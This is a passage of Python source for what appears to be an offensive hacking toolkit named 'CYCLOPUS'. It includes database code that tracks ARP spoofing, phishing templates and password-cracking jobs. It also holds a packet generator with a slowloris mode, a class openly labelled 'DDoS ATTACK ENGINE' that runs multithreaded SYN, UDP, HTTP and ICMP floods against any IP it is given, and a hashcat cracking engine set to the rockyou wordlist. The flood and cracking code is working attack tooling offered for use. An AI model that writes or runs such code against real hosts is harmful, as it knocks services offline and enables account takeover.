                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO arp_spoofing 
                   (target_ip, gateway_ip, interface, started_at, status)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
                (target_ip, gateway_ip, interface)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int,
                         duration: float, ended_at: str) -> bool:
        try:
            self.conn.execute(
                """UPDATE arp_spoofing 
                   SET packets_sent = ?, duration = ?, ended_at = ?, status = 'completed'
                   WHERE target_ip = ? AND gateway_ip = ?""",
                (packets_sent, duration, ended_at, target_ip, gateway_ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_arp_spoofs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM arp_spoofing WHERE status = ? ORDER BY started_at DESC",
                    (status,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
                    hostname: str = None) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO mac_info 
                   (mac_address, vendor, ip_address, hostname, last_seen)
                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
                (mac_address, vendor, ip_address, hostname)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add MAC info: {e}")
            return False
    
    def get_mac_info(self, mac_address: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                "SELECT * FROM mac_info WHERE mac_address = ?", (mac_address,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def add_nat_info(self, public_ip: str, private_ip: str, router_ip: str,
                    country: str, isp: str, nat_type: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO nat_info 
                   (public_ip, private_ip, router_ip, country, isp, nat_type)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (public_ip, private_ip, router_ip, country, isp, nat_type)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_nat_info(self, limit: int = 1) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM nat_info ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_domain_host(self, domain_host: 'DomainHost') -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active, port)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active, 8080)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Docker scan: {e}")
    
    def save_email(self, email_msg: 'EmailMessage') -> bool:
        try:
            self.conn.execute(
                """INSERT INTO email_messages 
                   (to_address, subject, body, from_address, html, attachments, status, sent_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_msg.to, email_msg.subject, email_msg.body, email_msg.from_email,
                 1 if email_msg.html else 0, json.dumps(email_msg.attachments),
                 email_msg.status, email_msg.sent_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save email: {e}")
            return False
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages WHERE status = ? ORDER BY created_at DESC LIMIT ?",
                    (status, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            emails = []
            for row in rows:
                email = dict(row)
                email['attachments'] = json.loads(email['attachments']) if email['attachments'] else []
                emails.append(email)
            return emails
        except Exception as e:
            print(f"Failed to get emails: {e}")
            return []
    
    def update_email_status(self, email_id: int, status: str):
        try:
            self.conn.execute(
                "UPDATE email_messages SET status = ?, sent_at = CURRENT_TIMESTAMP WHERE id = ?",
                (status, email_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update email status: {e}")
    
    def save_pdf_report(self, report: 'PDFReport') -> bool:
        try:
            self.conn.execute(
                """INSERT INTO pdf_reports 
                   (title, target, analysis, file_path, status)
                   VALUES (?, ?, ?, ?, ?)""",
                (report.title, report.target, json.dumps(report.analysis),
                 report.file_path, report.status)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save PDF report: {e}")
            return False
    
    def get_pdf_reports(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM pdf_reports ORDER BY created_at DESC LIMIT ?",
                (limit,)
            )
            reports = []
            for row in rows:
                report = dict(row)
                report['analysis'] = json.loads(report['analysis']) if report['analysis'] else {}
                reports.append(report)
            return reports
        except Exception as e:
            print(f"Failed to get PDF reports: {e}")
            return []
    
    def get_phishing_templates(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM phishing_templates ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_phishing_template(self, name: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                "SELECT * FROM phishing_templates WHERE name = ?", (name,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_phishing_template(self, name: str, category: str, html_content: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO phishing_templates (name, category, html_content, updated_at)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP)""",
                (name, category, html_content)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save template: {e}")
            return False
    
    def delete_phishing_template(self, name: str) -> bool:
        try:
            self.conn.execute("DELETE FROM phishing_templates WHERE name = ?", (name,))
            self.conn.commit()
            return True
        except:
            return False
    
    def save_clipboard(self, content: str, source: str = "system"):
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# TERMINAL ANIMATION ENGINE
# =====================
class TerminalAnimation:
    """Advanced terminal animation engine with multiple animation types"""
    
    @staticmethod
    def spinner(duration: float = 2.0, message: str = "Processing", style: str = "dots"):
        """Display a spinner animation"""
        spinner_chars = {
            'dots': ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
            'line': ['|', '/', '-', '\\'],
            'circle': ['◐', '◓', '◑', '◒'],
            'bounce': ['⠁', '⠂', '⠄', '⠂'],
            'pulse': ['█', '▓', '▒', '░', '▒', '▓']
        }
        chars = spinner_chars.get(style, spinner_chars['dots'])
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.CYAN}{chars[i % len(chars)]} {message}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1
        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def progress_bar(iterable, prefix: str = "Progress", length: int = 40, color: str = "CYAN"):
        """Display a progress bar with animation"""
        total = len(iterable)
        color_code = getattr(Colors, color, Colors.CYAN)
        for i, item in enumerate(iterable):
            progress = int(length * i / total)
            bar = '█' * progress + '░' * (length - progress)
            percent = int(100 * i / total)
            sys.stdout.write(f'\r{color_code}{prefix}: [{bar}] {percent}% ({i}/{total}){Colors.RESET}')
            sys.stdout.flush()
            yield item
        sys.stdout.write(f'\r{color_code}{prefix}: [{"█" * length}] 100% ({total}/{total}){Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def typing_effect(text: str, delay: float = 0.04, color: str = "CYAN"):
        """Display text with typing effect"""
        color_code = getattr(Colors, color, Colors.CYAN)
        for char in text:
            sys.stdout.write(f'{color_code}{char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def matrix_rain(duration: float = 2.0, density: int = 10):
        """Display matrix rain animation"""
        try:
            columns = shutil.get_terminal_size().columns
            chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
            start_time = time.time()
            while time.time() - start_time < duration:
                for _ in range(density):
                    row = ''.join(random.choice(chars) for _ in range(columns))
                    sys.stdout.write(f'\r{Colors.GREEN}{row}{Colors.RESET}')
                    sys.stdout.flush()
                    time.sleep(0.03)
            sys.stdout.write('\r' + ' ' * columns + '\r')
            sys.stdout.flush()
        except:
            pass
    
    @staticmethod
    def pulse_animation(text: str, duration: float = 2.0, color: str = "CYAN"):
        """Display pulsing text animation"""
        color_code = getattr(Colors, color, Colors.CYAN)
        start_time = time.time()
        while time.time() - start_time < duration:
            for brightness in range(0, 100, 10):
                if brightness < 50:
                    style = Style.DIM
                else:
                    style = Style.BRIGHT
                sys.stdout.write(f'\r{color_code}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
            for brightness in range(100, 0, -10):
                if brightness > 50:
                    style = Style.BRIGHT
                else:
                    style = Style.DIM
                sys.stdout.write(f'\r{color_code}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def wave_animation(text: str, duration: float = 2.0):
        """Display wave animation"""
        start_time = time.time()
        colors = [Colors.CYAN, Colors.BLUE, Colors.PURPLE, Colors.CYAN]
        while time.time() - start_time < duration:
            for i, color in enumerate(colors):
                prefix = ' ' * i
                sys.stdout.write(f'\r{color}{prefix}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def countdown(seconds: int, message: str = "Starting in"):
        """Display countdown animation"""
        for i in range(seconds, 0, -1):
            sys.stdout.write(f'\r{Colors.CYAN}{message} {i}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write('\r' + ' ' * (len(message) + 10) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def glitch_effect(text: str, duration: float = 1.0):
        """Display glitch effect animation"""
        start_time = time.time()
        while time.time() - start_time < duration:
            chars = list(text)
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(chars) - 1)
                chars[idx] = random.choice(['#', '@', '!', '*', '&', '%'])
            glitched = ''.join(chars)
            colors = [Colors.RED, Colors.GREEN, Colors.BLUE, Colors.PURPLE, Colors.CYAN]
            sys.stdout.write(f'\r{random.choice(colors)}{glitched}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write(f'\r{Colors.CYAN}{text}{Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def octopus_swim(duration: float = 2.0):
        """Display octopus swimming animation"""
        octopus_frames = [
            "   🐙   ",
            "  🐙   ",
            " 🐙   ",
            "🐙   ",
            " 🐙   ",
            "  🐙   ",
            "   🐙   "
        ]
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.CYAN}{octopus_frames[i % len(octopus_frames)]}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.15)
            i += 1
        sys.stdout.write('\r' + ' ' * 10 + '\r')
        sys.stdout.flush()

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        types = [t.value for t in TrafficType]
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'tcp_fin': self._tcp_fin,
            'tcp_rst': self._tcp_rst,
            'tcp_psh_ack': self._tcp_psh_ack,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random,
            'slowloris': self._slowloris,
            'psh_ack': self._tcp_psh_ack
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_fin(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="F")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_rst(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="R")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_psh_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="PA")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"CYCLOPUS"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"CYCLOPUS", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "CYCLOPUS"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "CYCLOPUS"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "CYCLOPUS"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns', 'tcp_ack', 'tcp_fin', 'tcp_rst']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _slowloris(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: " + target.encode() + b"\r\n")
            time.sleep(10)
            sock.close()
            return 100
        except:
            return 0
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-tuning', options['tuning']])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_available_scan_types(self) -> List[str]:
        return ["full", "ssl", "cgi", "sql", "xss"]

# =====================
# DDoS ATTACK ENGINE
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        max_threads = self.config.get('dos.max_threads', 100)
        if threads > max_threads:
            return {'success': False, 'error': f'Threads exceed maximum ({max_threads})'}
        
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        packets_sent = [0]
        
        def attack_thread():
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent[0] += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_ddos_attack(target_ip, attack_type, port, duration, threads, packets_sent[0], 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'attack_id': attack_id,
            'type': attack_type,
            'target': target_ip,
            'port': port,
            'duration': duration,
            'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "CYCLOPUS"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# CRACKING ENGINE
# =====================
class CrackingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_jobs = {}
        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
        self.wordlist_path = config.get('cracking.wordlist_path', '/usr/share/wordlists/rockyou.txt')
        self.default_hash_type = config.get('cracking.default_hash_type', 0)
    
    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
        job_id = str(uuid.uuid4())[:8]
        wordlist = wordlist or self.wordlist_path
        
        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
        
        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
        self.db.update_cracking_job(job_id, 'running')
        
        try:
            hash_type_num = self._get_hash_type_num(hash_type)
            
            cmd = [
                self.hashcat_path,
                '-m', str(hash_type_num),
                '-a', '0',
                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
                hash_value,
                wordlist
            ]
            
            if not shutil.which(self.hashcat_path):
                result = self._crack_with_python(hash_type, hash_value, wordlist)
                if result:
                    self.db.update_cracking_job(job_id, 'completed', result, True)
                else:
